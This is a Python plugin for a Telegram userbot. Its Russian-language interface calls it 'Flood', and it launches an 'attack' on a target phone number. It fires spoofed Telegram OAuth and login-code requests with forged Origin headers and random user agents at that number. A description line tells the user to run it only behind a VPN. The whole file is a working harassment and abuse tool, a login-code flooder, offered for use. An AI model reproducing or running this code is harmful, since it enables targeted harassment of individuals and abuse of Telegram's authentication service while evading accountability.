import asyncio
import requests
from fake_useragent import UserAgent
from modules.base import BaseModule
from utils import logger

ua = UserAgent()

async def _send_requests_with_logging(event, phone: str):
    bots = [
        ('5444323279', 'https://fragment.com'),
        ('5731754199', 'https://steam.kupikod.com'),
        ('210944655',  'https://combot.org'),
        ('319709511',  'https://telegrambot.biz'),
        ('1199558236', 'https://bot-t.com'),
        ('5709824482', 'https://lzt.market'),
        ('1803424014', 'https://ru.telegram-store.com'),
        ('5463728243', 'https://www.spot.uz'),
        ('6708902161', 'https://ourauthpoint777.com'),
        ('1852523856', 'https://cabinet.presscode.app'),
        ('582947301',  'https://telegram.org'),
        ('193144122',  'https://my.telegram.org'),
        ('106200000',  'https://ads.telegram.org'),
        ('777000',     'https://t.me'),
        ('624147665',  'https://fragment.com'),
    ]
    
    extra_urls = [
        'https://my.telegram.org/auth/send_password',
        'https://ads.telegram.org/auth/',
        'https://oauth.telegram.org/auth',
    ]

    total_tasks = len(bots) + len(extra_urls)
    completed = 0

    for bot_id, origin in bots:
        try:
            resp = await asyncio.to_thread(
                requests.post,
                "https://oauth.telegram.org/auth/request",
                headers={
                    'User-Agent': ua.random,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': origin,
                    'Referer': origin
                },
                data={
                    'phone': phone,
                    'bot_id': bot_id,
                    'origin': origin,
                    'request_access': 'write',
                    'return_to': origin
                },
                timeout=7
            )
            status = "OK" if resp.status_code == 200 else f"HTTP {resp.status_code}"
            logger.info(f"Flood > Bot {logger.accent(bot_id)} via {origin} | {status}")
        except Exception as e:
            logger.error(f"Flood > Bot {bot_id} Error: {e}")
        
        completed += 1
        if completed % 3 == 0:
            await event.edit(f"**FLOOD🍀**\n\n🎯 Цель: `+{phone}`\n⏳ Прогресс: `{completed}/{total_tasks}`")

    for url in extra_urls:
        try:
            resp = await asyncio.to_thread(
                requests.post,
                url,
                headers={'User-Agent': ua.random},
                data={'phone': phone},
                timeout=7
            )
            status = "OK" if resp.status_code == 200 else f"HTTP {resp.status_code}"
            logger.info(f"Flood > Extra {logger.accent(url)} | {status}")
        except Exception as e:
            logger.error(f"Flood > Extra Error {url}: {e}")
            
        completed += 1
        await event.edit(f"**FLOOD🍀**\n\n🎯 Цель: `+{phone}`\n⏳ Прогресс: `{completed}/{total_tasks}`")

    return completed


async def _flood(event):
    
    args = event.raw_text.strip().split(maxsplit=1)
    if len(args) < 2:
        await event.edit("**FLOOD🍀**\n\n❌ Использование: `.flood +71234567890`")
        return

    target = args[1].strip()
    phone = ''.join(filter(str.isdigit, target))
    
    if not phone or len(phone) < 10:
        await event.edit("**FLOOD🍀**\n\n❌ Некорректный номер телефона")
        return

    await event.edit(f"**FLOOD🍀**\n\n🎯 **Цель:** `+{phone}`\n🚀 **Статус:** `Запуск атаки...`")
    
    try:
        total_sent = await _send_requests_with_logging(event, phone)
        
        await event.edit(
            f"**FLOOD 🍀**\n\n"
            f"🎯 **Цель:** `+{phone}`\n"
            f"✅ **Завершено!**\n"

        )
        logger.success(f"Атака на {phone} завершена")
    except Exception as e:
        logger.error(f"Критическая ошибка в Flood: {e}")
        await event.edit(f"**FLOOD🍀**\n\n❌ Критическая ошибка: `{e}`")


def setup() -> BaseModule:
    return BaseModule(
        name="Flood",
        version="1.0",
        description="Флуд запросами авторизации Telegram (БЕЗ VPN НЕ ИСПОЛЬЗОВАТЬ)",
        commands={
            "flood": _flood,
        },
        examples=[
            "`.flood +71234567890` – начать флуд кодами"
        ],
    )
